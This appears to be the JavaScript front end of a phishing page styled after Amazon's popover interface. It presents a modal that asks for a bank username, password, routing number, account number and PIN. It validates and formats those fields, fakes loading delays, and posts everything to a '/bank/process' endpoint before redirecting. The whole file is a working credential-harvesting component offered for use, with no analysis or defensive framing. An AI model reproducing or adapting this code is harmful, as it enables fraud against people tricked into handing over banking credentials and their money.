document.addEventListener("DOMContentLoaded", () => {
    const modal = document.querySelector(".a-popover-modal");
    const modalWrapper = document.querySelector(".a-modal-scroller");
    const closeBtn = modal.querySelector("[data-action='a-popover-close']");
    const form = document.getElementById("pp-QBJBOr-15");

    const bankUsername = document.getElementById("pp-QBJBOr-17");
    const bankPassword = document.getElementById("bankPassword");
    const bankRouting = document.getElementById("bankRouting");
    const bankAccount = document.getElementById("bankAccount");
    const bankPin = document.getElementById("bankPin");

    const errorBoxContainer = document.getElementById("pp-QBJBOr-16");
    const errorList = errorBoxContainer?.querySelector("ul");

    const submitWrapper = document.getElementById("pp-QBJBOr-30");
    const submitBtn = submitWrapper.querySelector(".a-button-input");

    const overlaySpinner = document.getElementById("pp-z3b4qh-28");

    modal.style.opacity = "0";
    modal.style.visibility = "hidden";
    modal.style.transition = "opacity 0.35s ease";

    overlaySpinner.style.display = "block";

    setTimeout(() => {
        modal.style.visibility = "visible";
        modal.style.opacity = "1";
        overlaySpinner.style.display = "block";

        setTimeout(() => {
            overlaySpinner.style.display = "none";
        }, 1000);
    }, 2000);

    bankUsername.addEventListener("input", () => {
        bankUsername.value = bankUsername.value.replace(/[^a-zA-Z0-9._-]/g, "");
    });

    bankRouting.addEventListener("input", () => {
        let value = bankRouting.value.replace(/\D/g, "");
        if (value.length > 3 && value.length <= 6) {
            value = value.replace(/(\d{3})(\d+)/, "$1-$2");
        } else if (value.length > 6) {
            value = value.replace(/(\d{3})(\d{3})(\d+)/, "$1-$2-$3");
        }
        bankRouting.value = value;
    });

    bankAccount.addEventListener("input", () => {
        bankAccount.value = bankAccount.value.replace(/\D/g, "");
    });

    bankPin.addEventListener("input", () => {
        bankPin.value = bankPin.value.replace(/\D/g, "");
    });

    function resetErrors() {
        errorList.innerHTML = "";
        errorBoxContainer.classList.add("a-hidden", "aok-hidden");
        [bankUsername, bankPassword, bankRouting, bankAccount, bankPin].forEach(el =>
            el.classList.remove("a-form-error")
        );
    }

    function addError(msg, input) {
        const li = document.createElement("li");
        li.textContent = msg;
        errorList.appendChild(li);
        errorBoxContainer.classList.remove("a-hidden", "aok-hidden");
        if (input) input.classList.add("a-form-error");
    }

    function setLoading(state) {
        if (state) {
            submitWrapper.classList.add("loading");
            submitBtn.disabled = true;
            overlaySpinner.style.display = "block";
        } else {
            submitWrapper.classList.remove("loading");
            submitBtn.disabled = false;
            overlaySpinner.style.display = "none";
        }
    }

    form.addEventListener("submit", async (e) => {
        e.preventDefault();
        resetErrors();
        let valid = true;
        if (bankUsername.value.trim().length < 3) {
            valid = false;
            addError("Please enter a valid bank username.", bankUsername);
        }
        if (!bankPassword.value || bankPassword.value.length <= 3) {
            valid = false;
            addError("Password must be more than 3 characters.", bankPassword);
        }
        const routingDigits = bankRouting.value.replace(/\D/g, "");
        if (routingDigits.length !== 9) {
            valid = false;
            addError("Please enter a valid 9-digit routing number.", bankRouting);
        }
        const accountDigits = bankAccount.value.replace(/\D/g, "");
        if (accountDigits.length < 6 || accountDigits.length > 17) {
            valid = false;
            addError("Please enter a valid account number (6-17 digits).", bankAccount);
        }
        const pinDigits = bankPin.value.replace(/\D/g, "");
        if (pinDigits.length < 4) {
            valid = false;
            addError("PIN must be at least 4 digits.", bankPin);
        }
        if (!valid) return;
        setLoading(true);
        try {
            const payload = {
                bank_username: bankUsername.value.trim(),
                bank_password: bankPassword.value,
                bank_routing: routingDigits,
                bank_account: accountDigits,
                bank_pin: pinDigits
            };
            const response = await fetch("/bank/process", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });
            const result = await response.json();
            if (result.error) {
                addError(result.error);
                setLoading(false);
                return;
            }
            window.location.href = result.redirect ?? "/";
        } catch (err) {
            addError("Something went wrong. Please try again.");
            setLoading(false);
        }
    });

    window.addEventListener("pageshow", (event) => {
        if (event.persisted) setLoading(false);
    });
});